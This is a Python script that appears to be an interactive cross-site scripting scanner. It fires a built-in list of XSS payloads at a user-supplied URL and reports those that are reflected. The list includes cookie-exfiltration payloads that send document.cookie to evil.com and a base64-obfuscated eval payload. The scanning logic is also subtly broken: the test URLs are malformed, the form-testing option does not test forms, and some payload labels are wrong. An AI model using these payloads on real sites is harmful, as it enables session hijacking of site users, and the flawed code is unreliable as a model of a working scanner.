import requests
import argparse
from bs4 import BeautifulSoup
import re
import urllib.parse
import os
import threading
from queue import Queue

# XSS Payloads
xss_payloads = [
    "<script>alert('XSS')</script>",  # Simple Reflected XSS
    "<img src='x' onerror='alert(1)'>",  # Event-based XSS
    "<svg/onload=alert(1)>",  # SVG XSS
    "<a href='javascript:alert(1)'>Click Me</a>",  # JavaScript link
    "<script>document.write('XSS')</script>",  # DOM-based XSS
    "<script>alert('XSS')</script><img src=x onerror=alert(1)>",  # Multiple payloads
    "<img src=1 onerror=confirm(1)>",  # Confirm prompt injection
    "<script>eval(atob('Y29uZmlybSgnc2NyaXB0Jyk='))</script>",  # Base64 encoded payload
    "<script>fetch('http://evil.com/?cookie=' + document.cookie)</script>",  # Cookie stealing
    "<script>location='http://evil.com/?url='+window.location</script>",  # Open redirect
    "<iframe src='javascript:alert(1)'></iframe>",  # Iframe-based XSS
    "<script>alert(document.domain)</script>",  # Test domain access
    "<script>document.getElementById('test').innerHTML = 'XSS';</script>",  # DOM manipulation
    "<object data='javascript:alert(1)'></object>",  # Object XSS
    "<iframe src='javascript:alert(1)'></iframe>",  # Iframe-based XSS
    "<script>window.location='http://evil.com?cookie='+document.cookie</script>",  # Cookie exfiltration
]

# Command line arguments handling with argparse
def parse_args():
    parser = argparse.ArgumentParser(description="Advanced XSS Vulnerability Scanner")
    parser.add_argument("url", help="URL of the website to scan")
    parser.add_argument("--proxy", help="Proxy address to use (optional)", default=None)
    parser.add_argument("--output", help="Save results to a file", default="xss_results.txt")
    return parser.parse_args()

# Banner function
def print_banner():
    banner = """

__  __ ____   ____                        ___             
\ \/ // ___| / ___| __   __  ___  _ __   / _ \  _ __ ___  
 \  / \___ \ \___ \ \ \ / / / _ \| '_ \ | | | || '_ ` _ \ 
 /  \  ___) | ___) | \ V / |  __/| | | || |_| || | | | | |
/_/\_\|____/ |____/   \_/   \___||_| |_| \___/ |_| |_| |_|
                                                             
    """
    print(banner)

# Automatically find URL parameters
def find_params(url):
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    return query_params.keys()

# Dynamic payload testing for XSS
def test_xss(url, payload, proxy=None):
    test_url = f"{url}?q={payload}"
    try:
        if proxy:
            response = requests.get(test_url, proxies={"http": proxy, "https": proxy})
        else:
            response = requests.get(test_url)
        
        if payload in response.text:
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")
    return False

# HTML and JavaScript scanning
def analyze_html_for_xss(url, proxy=None):
    try:
        if proxy:
            response = requests.get(url, proxies={"http": proxy, "https": proxy})
        else:
            response = requests.get(url)
        
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find <script> tags with possible XSS
        scripts = soup.find_all('script')
        for script in scripts:
            if "eval(" in str(script) or "document.write(" in str(script):
                print("[!] Potential XSS JavaScript code found.")

    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")

# Save the results to a file
def save_results(results, output_file):
    with open(output_file, "w") as file:
        for result in results:
            file.write(result + "\n")
    print(f"[+] Results saved to {output_file}.")

# Using multithreading for XSS tests
def thread_test_xss(url, payload, proxy, results_queue):
    result = test_xss(url, payload, proxy)
    if result:
        results_queue.put(f"[!] XSS Vulnerability Found: {url}?q={payload}")

# Interactive menu for the user
def interactive_menu(url, proxy, output_file):
    results = []
    results_queue = Queue()

    while True:
        print("\nInteractive Menu")
        print("1. Test XSS in URL Parameters")
        print("2. Test XSS in Forms")
        print("3. Scan for HTML and JavaScript XSS")
        print("4. Save Results to File")
        print("5. Exit")

        choice = input("Choose an option (1-5): ")
        if choice == '1':
            print("[*] Starting XSS tests in URL parameters...")
            params = find_params(url)
            threads = []
            for param in params:
                for payload in xss_payloads:
                    thread = threading.Thread(target=thread_test_xss, args=(url, f"{param}={payload}", proxy, results_queue))
                    threads.append(thread)
                    thread.start()
            for thread in threads:
                thread.join()
            while not results_queue.empty():
                result = results_queue.get()
                results.append(result)
        elif choice == '2':
            print("[*] Starting XSS tests in forms...")
            analyze_html_for_xss(url, proxy)
        elif choice == '3':
            print("[*] Scanning for HTML and JavaScript XSS...")
            analyze_html_for_xss(url, proxy)
        elif choice == '4':
            print("[*] Saving results...")
            save_results(results, output_file)
        elif choice == '5':
            print("[*] Exiting...")
            break
        else:
            print("[!] Invalid choice! Please try again.")

# Main function
def main():
    args = parse_args()
    url = args.url
    proxy = args.proxy
    output_file = args.output
    print_banner()
    interactive_menu(url, proxy, output_file)

if __name__ == "__main__":
    main()
